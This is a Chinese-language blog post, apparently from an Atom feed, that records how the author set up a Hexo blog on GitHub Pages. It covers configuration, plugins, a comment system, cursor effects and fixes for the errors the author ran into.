    <content type="html"><![CDATA[<p>很早就有建一个自己的博客网站的想法了，可能也是想可以倒逼自己多写点东西吧。从安装hexo开始、更换主题、添加功能和第三方服务、部署到github pages上，一步步完善自己的博客。期间踩到了数不清的坑，历时一个月，终于把博客的雏形给做出来了。    <a id="more"></a></p><h1 id="搭建框架与部署"><a href="#搭建框架与部署" class="headerlink" title="搭建框架与部署"></a>搭建框架与部署</h1><p>参考 <a href="https://www.bilibili.com/video/BV1Yb411a7ty?from=search&seid=2359438930998851478">手把手教你从0开始搭建自己的个人博客 |无坑版视频教程| hexo</a>。</p><h1 id="Hexo-配置"><a href="#Hexo-配置" class="headerlink" title="Hexo 配置"></a>Hexo 配置</h1><h2 id="分类方法"><a href="#分类方法" class="headerlink" title="分类方法"></a>分类方法</h2><p>参考 <a href="https://hexo.io/zh-cn/docs/front-matter">hexo中文文档</a>。</p><p>在其他系统中，分类和标签听起来很接近，但是在 Hexo 中两者有着明显的差别：分类具有顺序性和层次性，也就是说 <code>Foo, Bar</code> 不等于 <code>Bar, Foo</code>；而标签没有顺序和层次。</p><p>WordPress 支持对一篇文章设置多个分类，而且这些分类可以是同级的，也可以是父子分类。但是 Hexo 不支持指定多个同级分类。下面的指定方法：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categories:</span><br><span class="line"><span class="bullet">  -</span> Diary</span><br><span class="line"><span class="bullet">  -</span> Life</span><br></pre></td></tr></table></figure><p>会使分类<code>Life</code>成为<code>Diary</code>的子分类，而不是并列分类。因此，有必要为您的文章选择尽可能准确的分类。</p><p>如果你需要为文章添加多个分类，可以尝试以下 list 中的方法。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">categories:</span><br><span class="line"><span class="bullet">- </span>[Diary, PlayStation]</span><br><span class="line"><span class="bullet">- </span>[Diary, Games]</span><br><span class="line"><span class="bullet">- </span>[Life]</span><br></pre></td></tr></table></figure><p>此时这篇文章同时包括三个分类： <code>PlayStation</code> 和 <code>Games</code> 分别都是父分类 <code>Diary</code> 的子分类，同时 <code>Life</code> 是一个没有子分类的分类。</p><h2 id="相对路径引用的标签"><a href="#相对路径引用的标签" class="headerlink" title="相对路径引用的标签"></a>相对路径引用的标签</h2><p>通过常规的 markdown 语法和相对路径来引用图片和其它资源可能会导致它们在存档页或者主页上显示不正确。</p><p>正确的引用图片方式是使用下列的标签插件而不是 markdown ：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="symbol">%</span> asset_img <span class="built_in">example</span>.jpg This <span class="built_in">is</span> an <span class="built_in">example</span> <span class="built_in">image</span> <span class="symbol">%</span>&#125;</span><br></pre></td></tr></table></figure><p>通过这种方式，图片将会同时出现在文章和主页以及归档页中。</p><h2 id="URL-中的分类和标签「翻译」成英文"><a href="#URL-中的分类和标签「翻译」成英文" class="headerlink" title="URL 中的分类和标签「翻译」成英文"></a>URL 中的分类和标签「翻译」成英文</h2><p>参考 <a href="https://github.com/hexojs/hexo/issues/1162">hexo issues</a>。</p><p>在<code>_config.yml</code>的<code># Category &amp; Tag</code>一项下面的<code>tag_map</code>和<code>category_map</code>下面这样配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span></span><br><span class="line"><span class="attr">category_map:</span></span><br><span class="line">    <span class="string">Linux操作系统:</span> <span class="string">Linux-OS</span></span><br><span class="line">    <span class="string">中文分类:</span> <span class="string">英文分类</span></span><br><span class="line"><span class="attr">tag_map:</span></span><br><span class="line">    <span class="string">中文标签:</span> <span class="string">英文标签</span></span><br></pre></td></tr></table></figure><h2 id="添加网站图标"><a href="#添加网站图标" class="headerlink" title="添加网站图标"></a>添加网站图标</h2><ol><li><p>选择好自己的图标，没有的话可以去 <a href="https://www.iconfont.cn/">阿里巴巴矢量图标库</a> 挑一个。</p></li><li><p>将下载的图片在 <a href="https://www.websiteplanet.com/zh-hans/webtools/favicon-generator/">网站图标生成</a> 上转换格式。</p></li><li><p>把它放入主题文件夹下面的 source/images/ 下面</p></li><li><p>在主题配置文件中修改</p></li></ol><p><img src="/2020/hexo-githubPages-setUp-record/Snipaste_2020-08-24_20-22-36.png" alt="修改favicon配置"></p><h2 id="更改文章url为英文"><a href="#更改文章url为英文" class="headerlink" title="更改文章url为英文"></a>更改文章url为英文</h2><p>在站点的<code>_config.yml</code>中，生成的文章链接默认为：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br></pre></td></tr></table></figure><ol><li><p>将<code>/:title/</code>替换为<code>/:urlname/</code></p></li><li><p>更改<code>permalink_defaults</code></p></li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line">  <span class="attr">urlname:</span> <span class="string">index</span></span><br></pre></td></tr></table></figure><ol start="3"><li>之后写文章时在font-matter处加上<code>urlname: XXX</code>就可以了</li></ol><p><img src="/2020/hexo-githubPages-setUp-record/Snipaste_2020-09-06_10-31-34.png" alt="urlname"></p><p>还可以在<code>scaffolds/post.md</code>里配上这个字段</p><p><img src="/2020/hexo-githubPages-setUp-record/Snipaste_2020-09-06_10-33-53.png" alt="添加创建模板字段"></p><p>这样，以后<code>hexo n post &quot;&quot;</code>的时候就自动出现在font-matter里面了。</p><p><code>！</code>注意：以前的文章也需要加上urlname字段，内容与文章标题保持一致，否则就找不到了噢。（或者你也可以选择全部重建）</p><h1 id="添加小功能"><a href="#添加小功能" class="headerlink" title="添加小功能"></a>添加小功能</h1><h2 id="添加文章时自动打开编辑器"><a href="#添加文章时自动打开编辑器" class="headerlink" title="添加文章时自动打开编辑器"></a>添加文章时自动打开编辑器</h2><p>参考 <a href="%5Bhttps://notes.doublemine.me/2015-06-29-Hexo%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E6%97%B6%E8%87%AA%E5%8A%A8%E6%89%93%E5%BC%80%E7%BC%96%E8%BE%91%E5%99%A8.html%5D(https://notes.doublemine.me/2015-06-29-Hexo%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E6%97%B6%E8%87%AA%E5%8A%A8%E6%89%93%E5%BC%80%E7%BC%96%E8%BE%91%E5%99%A8.html)">Hexo 添加文章时自动打开编辑器 - Doublemine</a> 。以下为博客内容：</p><ul><li>首先在Hexo目录下的<code>scripts</code>目录中创建一个JavaScript脚本文件。</li><li>如果没有这个<code>scripts</code>目录，则新建一个。</li><li><code>scripts</code>目录新建的JavaScript脚本文件可以任意取名。</li></ul><p>通过这个脚本，我们用其来监听<code>hexo new</code>这个动作，并在检测到<code>hexo new</code>之后，执行编辑器打开的命令。</p><p>如果你是windows平台的Hexo用户，则将下列内容写入你的脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> spawn = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hexo 2.x 用户复制这段</span></span><br><span class="line">hexo.on(<span class="string">&#x27;new&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">path</span>)</span>&#123;</span><br><span class="line">  spawn(<span class="string">&#x27;start  &quot;markdown编辑器绝对路径.exe&quot; &#x27;</span> + path);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hexo 3 用户复制这段</span></span><br><span class="line">hexo.on(<span class="string">&#x27;new&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">  spawn(<span class="string">&#x27;start  &quot;markdown编辑器绝对路径.exe&quot; &#x27;</span> + data.path);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如果你是Mac平台Hexo用户，则将下列内容写入你的脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> exec = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hexo 2.x 用户复制这段</span></span><br><span class="line">hexo.on(<span class="string">&#x27;new&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">path</span>)</span>&#123;</span><br><span class="line">    exec(<span class="string">&#x27;open -a &quot;markdown编辑器绝对路径.app&quot; &#x27;</span> + path);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Hexo 3 用户复制这段</span></span><br><span class="line">hexo.on(<span class="string">&#x27;new&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    exec(<span class="string">&#x27;open -a &quot;markdown编辑器绝对路径.app&quot; &#x27;</span> + data.path);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>保存并退出脚本之后，在命令行中键入：   </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;auto open editor test&quot;</span><br></pre></td></tr></table></figure><p>就可以打开编辑器了。</p><h2 id="主动推送Hexo博客新链接至搜索平台"><a href="#主动推送Hexo博客新链接至搜索平台" class="headerlink" title="主动推送Hexo博客新链接至搜索平台"></a>主动推送Hexo博客新链接至搜索平台</h2><p>使用插件 hexo-submit-urls-to-search-engine ，查看 <a href="https://cjh0613.com/20200603HexoSubmitUrlsToSearchEngine.html">中文文档</a>。</p><p>首先明确</p><p>1）站点配置文件，位于站点文件夹根目录内<code>~/blog/_config.yml</code></p><p>2）主题配置文件，位于主题文件夹根目录内<code>~/blog/themes/next/_config.yml</code></p><h2 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h2><p>有两个插件我比较喜欢，一个可以<a href="https://github.com/kchen0x/hexo-reference">悬浮显示</a>，一个比较<a href="https://github.com/LouisBarranqueiro/hexo-footnotes">简洁</a> 。</p><p><img src="/2020/hexo-githubPages-setUp-record/Snipaste_2020-08-20_16-18-02.png" alt="hexo两个脚注插件"><img src="/2020/hexo-githubPages-setUp-record/Snipaste_2020-08-20_16-18-11.png" alt="悬浮显示" style="zoom:50%;"></p><p><strong>Markdown</strong> 语法</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">basic footnote[^1]</span><br><span class="line">here is an inline footnote[<span class="string">^2</span>](<span class="link">inline footnote</span>)</span><br><span class="line">and another one[^3]</span><br><span class="line">and another one[^4]</span><br><span class="line"></span><br><span class="line">[<span class="symbol">^1</span>]: <span class="link">basic footnote content</span></span><br><span class="line">[<span class="symbol">^3</span>]: <span class="link">paragraph</span></span><br><span class="line">footnote</span><br><span class="line">content</span><br><span class="line">[<span class="string">^4</span>]: footnote content with some [<span class="string">markdown</span>](<span class="link">https://en.wikipedia.org/wiki/Markdown</span>)</span><br></pre></td></tr></table></figure><h2 id="添加评论系统"><a href="#添加评论系统" class="headerlink" title="添加评论系统"></a>添加评论系统</h2><p><a href="https://www.jianshu.com/p/3e200908b9fc">各种评论系统的比较</a> ，我使用的是 valine。支持Markdown，重点是好看！</p><p>参考 <a href="%5Bhttps://qianfanguojin.github.io/2019/07/23/Hexo%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6%EF%BC%9A%E4%B8%BANext%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0Valine%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/%5D(https://qianfanguojin.github.io/2019/07/23/Hexo%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6%EF%BC%9A%E4%B8%BANext%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0Valine%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/)">为Next主题添加Valine评论系统</a> 。</p><p>我这里踩了一个坑，之前在LeanCloud上操作过，不知道是设置了些什么账号出了问题，之后我换了一个节点重新新建一个项目，填入新的appId和appKey后就好了。</p><h1 id="主题美化"><a href="#主题美化" class="headerlink" title="主题美化"></a>主题美化</h1><h2 id="鼠标点击特效"><a href="#鼠标点击特效" class="headerlink" title="鼠标点击特效"></a>鼠标点击特效</h2><p>扒自 <a href="http://yearito.cn/posts/hexo-theme-beautify.html">Hexo 搭建个人博客系列：主题美化篇</a> 。</p><p>以下为四个比较常用的鼠标点击特效：</p><ul><li><a href="http://yearito.cn/posts/hexo-theme-beautify.html#%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E7%89%B9%E6%95%88-1">礼花特效</a></li><li><a href="http://yearito.cn/posts/hexo-theme-beautify.html#%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E7%89%B9%E6%95%88-2">爆炸特效</a></li><li><a href="http://yearito.cn/posts/hexo-theme-beautify.html#%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E7%89%B9%E6%95%88-3">浮出爱心</a></li><li><a href="http://yearito.cn/posts/hexo-theme-beautify.html#%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E7%89%B9%E6%95%88-4">浮出文字</a></li></ul><p><a href="http://yearito-1256884783.image.myqcloud.com/hexo-theme-beautify/cursor-fireworks.gif"><img src="http://yearito-1256884783.image.myqcloud.com/hexo-theme-beautify/cursor-fireworks.gif" alt="img" style="zoom:50%; display:inline;"></a>   <a href="http://yearito-1256884783.image.myqcloud.com/hexo-theme-beautify/cursor-explosion.gif"> <img src="http://yearito-1256884783.image.myqcloud.com/hexo-theme-beautify/cursor-explosion.gif" alt="img" style="zoom:50%; display:inline;"></a>   </p><p>点击下方链接下载相应的脚本，并置于 themes\next\source\js\cursor\ 目录下：</p><p><a href="https://script-1256884783.file.myqcloud.com/cursor/fireworks.js">礼花特效</a>                  <a href="https://script-1256884783.file.myqcloud.com/cursor/explosion.min.js">爆炸特效</a>                   <a href="https://script-1256884783.file.myqcloud.com/cursor/love.min.js">浮出爱心</a>                  <a href="https://script-1256884783.file.myqcloud.com/cursor/text.js">浮出文字</a></p><p>在主题自定义布局文件中添加以下代码：</p><p>themes\next\layout_custom\custom.swig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;# 鼠标点击特效 #&#125;</span><br><span class="line">&#123;% if theme.cursor_effect &#x3D;&#x3D; &quot;fireworks&quot; %&#125;</span><br><span class="line">  &lt;script async src&#x3D;&quot;&#x2F;js&#x2F;cursor&#x2F;fireworks.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&#123;% elseif theme.cursor_effect &#x3D;&#x3D; &quot;explosion&quot; %&#125;</span><br><span class="line">  &lt;canvas class&#x3D;&quot;fireworks&quot; style&#x3D;&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;&#x2F;canvas&gt;</span><br><span class="line">  &lt;script src&#x3D;&quot;&#x2F;&#x2F;cdn.bootcss.com&#x2F;animejs&#x2F;2.2.0&#x2F;anime.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;script async src&#x3D;&quot;&#x2F;js&#x2F;cursor&#x2F;explosion.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&#123;% elseif theme.cursor_effect &#x3D;&#x3D; &quot;love&quot; %&#125;</span><br><span class="line">  &lt;script async src&#x3D;&quot;&#x2F;js&#x2F;cursor&#x2F;love.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&#123;% elseif theme.cursor_effect &#x3D;&#x3D; &quot;text&quot; %&#125;</span><br><span class="line">  &lt;script async src&#x3D;&quot;&#x2F;js&#x2F;cursor&#x2F;text.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>如果 custom.swig 文件不存在，需要手动新建并在布局页面中 body 末尾引入：</p><p>themes\next\layout_layout.swig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">            ...</span><br><span class="line">      &#123;% include &#39;_third-party&#x2F;exturl.swig&#39; %&#125;</span><br><span class="line">      &#123;% include &#39;_third-party&#x2F;bookmark.swig&#39; %&#125;</span><br><span class="line">      &#123;% include &#39;_third-party&#x2F;copy-code.swig&#39; %&#125;</span><br><span class="line"></span><br><span class="line">+     &#123;% include &#39;_custom&#x2F;custom.swig&#39; %&#125;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">  &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>在主题配置文件中添加以下代码：</p><p>themes\next_config.yml</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mouse click effect: fireworks | explosion | love | text</span></span><br><span class="line"><span class="attr">cursor_effect:</span> <span class="string">fireworks</span></span><br></pre></td></tr></table></figure><p>这样即可在配置文件中一键快速切换鼠标点击特效。</p><p>如果从本地加载 JS 脚本速度较慢，可以考虑将脚本放到 CDN 上再引入。</p><h1 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h1><h2 id="安装置顶插件"><a href="#安装置顶插件" class="headerlink" title="安装置顶插件"></a>安装置顶插件</h2><p>替换给文章排序索引的原有插件 hexo-generator-index为hexo-generator-indexed</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm uni hexo-generator-<span class="built_in">index</span> --<span class="keyword">save</span> &amp;&amp; npm i hexo-generator-indexed --<span class="keyword">save</span></span><br></pre></td></tr></table></figure><p>报错：</p><p><img src="/2020/hexo-githubPages-setUp-record/image-20200817162704023.png" alt="报错信息"></p><p>解决方案：</p><p>1.fsevents不在package.json里，但是仍然安装了。我的系统是Windows系统，fsevents是darwin的可选依赖。博客主人在里面安装了fsevents相关依赖库，所以到这边也就安装到我的windows上了。“检查你的package.json 文件中是不是有fsevents相关依赖，删除即好。”但我的package.json文件中并没有，所以采取了第二种方案。</p><p>2.在package.json中加入下面代码，将fsevents依赖变为可选的。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;optionalDependencies&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;fsevents&quot;</span>: <span class="string">&quot;*&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步中据说有一个坑，“需要删除package_lock.json,否则标记会失效，所有依赖都将被安装。”</p><p>“I’m seeing this today with npm 5.3.0. npm install –no-optional works IIF a package-lock.json does not exist. If the package-lock.json file exists, then the flag is ignored and all dependencies get installed.”</p><h2 id="生成静态文件错误"><a href="#生成静态文件错误" class="headerlink" title="生成静态文件错误"></a>生成静态文件错误</h2><p>执行 <code>hexo g</code> 的时候出现了下面的错误</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ERROR Template render error: (Y:\Blog\hexo3\themes\next\layout\post.swig)</span><br><span class="line"></span><br><span class="line"><span class="function">Error: <span class="title">Unable</span> <span class="title">to</span> <span class="title">call</span> `<span class="title">value</span>[&quot;<span class="title">split</span>&quot;]`, <span class="title">which</span> <span class="title">is</span> <span class="title">undefined</span> <span class="title">or</span> <span class="title">falsey</span></span></span><br></pre></td></tr></table></figure><p>网上搜了很多类似的问题都没有解决问题，后来看到一篇文章说是博客的格式有误，出现了识别不了的记号。我将博客移出后再执行果然没有报错了。但是对照别人写的<code>.md</code>文件，我的博客没有什么格式不正确的地方。</p><p>之后我又尝试了将<code>主题配置文件</code>恢复成初始状态，这样解决了问题，但我不知道是哪里错了，可能是改的过程中将格式写错了。</p><h2 id="本地与部署不一致问题"><a href="#本地与部署不一致问题" class="headerlink" title="本地与部署不一致问题"></a>本地与部署不一致问题</h2><p>参考 <a href="https://blog.csdn.net/GAI159/article/details/105128186/">解决hexo本地与部署不一致问题</a>。</p><p>可能原因：</p><p>1.URL配置错误(写上自己的博客地址)</p><p><img src="/2020/hexo-githubPages-setUp-record/2020-08-19_11-33-46.png" alt="站点配置信息"></p><p>2.部署到远程服务器没来得及更新，过一段时间再看</p><p>3.浏览器保存了之前的数据，清除浏览器缓存后再强制刷新Shift+F5 （√）</p><p>4.如果上面几种都还没有解决问题，也可能是branch错误 </p><p><img src="/2020/hexo-githubPages-setUp-record/20200326212416815.jpg" alt="推到另一个分支"></p><p>之后在hexo站点配置文件_config.yml中找到branch，将master改为刚刚新建的分支名。</p><h2 id="博客图片显示不出"><a href="#博客图片显示不出" class="headerlink" title="博客图片显示不出"></a>博客图片显示不出</h2><p>我一般是采用截图后直接将图片粘贴到博客中的做法，这样当然找不到了，图片文件都没有到github里面去。</p><p>解决办法：</p><p>安装插件 </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>在站点配置文件*/_config.yml* 中配置指令 <code>post_asset_folder: true</code> 这样在每次新建文章的时候就会建立同名文件夹, 直接将相应的文章图片放在文件夹内。</p><p><img src="/2020/hexo-githubPages-setUp-record/Snipaste_2020-08-19_11-54-33.png" alt="文件结构"></p><p>之后引用的时候可以使用markdown语法</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">文件结构</span>](<span class="link">hexo-github-pages-博客搭建记录/Snipaste_2020-08-19_11-54-33.png</span>)</span><br></pre></td></tr></table></figure><p>也可以使用hexo定义的标签</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="symbol">%</span> asset_img <span class="built_in">example</span>.jpg This <span class="built_in">is</span> an <span class="built_in">example</span> <span class="built_in">image</span> <span class="symbol">%</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="显示不出archives页面"><a href="#显示不出archives页面" class="headerlink" title="显示不出archives页面"></a>显示不出archives页面</h2><p>archives归档页面显示不出，但只要名字不是这个就没有问题。</p><h2 id="文章路径undefined"><a href="#文章路径undefined" class="headerlink" title="文章路径undefined"></a>文章路径undefined</h2><p>将<code>站点配置文件</code> permalink 修改后就好了。</p><p><img src="/2020/hexo-githubPages-setUp-record/Snipaste_2020-08-24_22-06-11.png" alt="配置信息"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;很早就有建一个自己的博客网站的想法了，可能也是想可以倒逼自己多写点东西吧。从安装hexo开始、更换主题、添加功能和第三方服务、部署到github pages上，一步步完善自己的博客。期间踩到了数不清的坑，历时一个月，终于把博客的雏形给做出来了。&lt;/p&gt;</summary>
    
    
    
    
    <category term="记录" scheme="https://www.fvolcano.red/tags/%E8%AE%B0%E5%BD%95/"/>
    
    <category term="博客搭建" scheme="https://www.fvolcano.red/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
</feed>
